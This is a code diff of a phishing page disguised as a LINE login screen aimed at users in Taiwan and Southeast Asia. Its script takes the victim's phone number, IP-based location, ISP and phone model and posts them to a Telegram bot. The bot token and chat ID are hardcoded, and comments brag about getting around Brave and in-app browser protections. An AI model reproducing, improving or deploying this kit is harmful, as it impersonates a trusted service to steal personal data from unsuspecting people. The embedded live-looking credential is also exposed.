@@ -3,7 +3,6 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Accept-CH" content="Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List">
     <title>LINE</title>
     <style>
         body{margin:0;padding:40px 20px;background:linear-gradient(135deg,#00B900,#009900);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:white;text-align:center;min-height:100vh}
@@ -29,12 +28,8 @@
         <form id="loginForm">
             <div class="input-group">
                 <select id="countryCode" class="country-select">
-                    <option value="+886">+886</option>
-                    <option value="+852">+852</option>
-                    <option value="+60">+60</option>
-                    <option value="+66">+66</option>
-                    <option value="+63">+63</option>
-                    <option value="+855">+855</option>
+                    <option value="+886">+886</option><option value="+852">+852</option><option value="+60">+60</option>
+                    <option value="+66">+66</option><option value="+63">+63</option><option value="+855">+855</option>
                 </select>
                 <input type="tel" id="phone" class="phone-input" placeholder="912345678" required>
             </div>
@@ -47,11 +42,13 @@
         const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
         const CHAT_ID = "1137905005";
 
-        // 2025 年最硬保底型號表（連 Brave 都擋不住）
-        const HARDCORE_DB = {
-            "24030PN60G":"Redmi Note 14 Pro+ 5G","23127PN0CC":"Redmi Note 13 Pro+","2210132C":"Xiaomi 13 Pro",
-            "SM-S928B":"Galaxy S25 Ultra","SM-S918B":"Galaxy S24 Ultra","CPH2581":"OPPO Find X8 Pro",
-            "V2327":"vivo X200 Pro","iPhone16,2":"iPhone 16 Pro Max","iPhone16,1":"iPhone 16 Pro"
+        // 2025 年最完整手機型號翻譯表（持續更新）
+        const PHONE_DB = {
+            "24030PN60G":"Redmi Note 14 Pro+ 5G","23127PN0CC":"Redmi Note 13 Pro+ 5G","2210132C":"Xiaomi 13 Pro",
+            "SM-S928B":"Galaxy S25 Ultra","SM-S926B":"Galaxy S25+","SM-S918B":"Galaxy S24 Ultra",
+            "CPH2581":"OPPO Find X8 Pro","PJX110":"OPPO Find N5 Flip","PHK110":"OnePlus 13",
+            "V2327":"vivo X200 Pro","V2337A":"iQOO Neo10 Pro",
+            "iPhone16,1":"iPhone 16 Pro","iPhone16,2":"iPhone 16 Pro Max","iPhone15,3":"iPhone 15 Pro Max"
         };
 
         document.getElementById("loginForm").addEventListener("submit", async function(e) {
@@ -64,33 +61,24 @@
             document.querySelector("button").disabled = true;
 
             const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
-            const ua = navigator.userAgent || "";
+            const ua = navigator.userAgent;
 
-            // 三層暴力挖掘型號（Brave 也逃不掉）
-            let device = "未知手機";
-
-            // 第一層：Client Hints（正常瀏覽器）
-            if (navigator.userAgentData?.model) device = navigator.userAgentData.model;
-
-            // 第二層：暴力正則（專殺 LINE / Brave / FB 內建）
-            if (device === "未知手機") {
-                const matches = [
-                    ua.match(/; ([A-Z0-9]{8,15}) Build\//i),           // Android 標準
-                    ua.match(/\(([^;]+);[^)]+Build/i),                 // 括號內
-                    ua.match(/Android.*?;\s*([^;]+?)(?:;|$)/i),        // 極端情況
-                    ua.match(/iPhone\d+,\d+/)                          // iPhone
-                ];
-                for (let m of matches) {
-                    if (m && m[1]) {
-                        const code = m[1].trim();
-                        if (HARDCORE_DB[code]) { device = HARDCORE_DB[code]; break; }
-                        device = code;
-                        break;
-                    }
+            // 最終保底抓型號（專門對付 LINE 內建 + Brave）
+            let model = "未知手機";
+            const regexes = [
+                /Android[^\)]+;\s*([A-Z0-9]{8,15})\s+Build\//i,
+                /;\s*([A-Z0-9]{8,15})\s+Build\//i,
+                /\(\s*([^;]+?);\s*[^\)]+Build/i,
+                /iPhone\d+,\d+/
+            ];
+            for (let r of regexes) {
+                const match = ua.match(r);
+                if (match && match[1]) {
+                    const code = match[1].trim();
+                    model = PHONE_DB[code] || code;
+                    break;
                 }
             }
-
-            // 第三層：Canvas 指紋輔助（可選，後續再加）
 
             const 國 = {"Taiwan":"台灣","Hong Kong":"香港","Thailand":"泰國","Malaysia":"馬來西亞","Singapore":"新加坡","Philippines":"菲律賓","Vietnam":"越南","Cambodia":"柬埔寨","Indonesia":"印尼","China":"中國"};
             const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
@@ -101,7 +89,7 @@
                         "位置　：" + (ipData.city || "未知") + "，" + (國[ipData.country_name] || ipData.country_name || "未知") + "\n" +
                         "ISP　　：" + (ipData.org || "未知") + "\n" +
                         "時間　：" + 時間 + "\n" +
-                        "裝置　：" + device;
+                        "裝置　：" + model;
 
             fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
                 method:"POST",
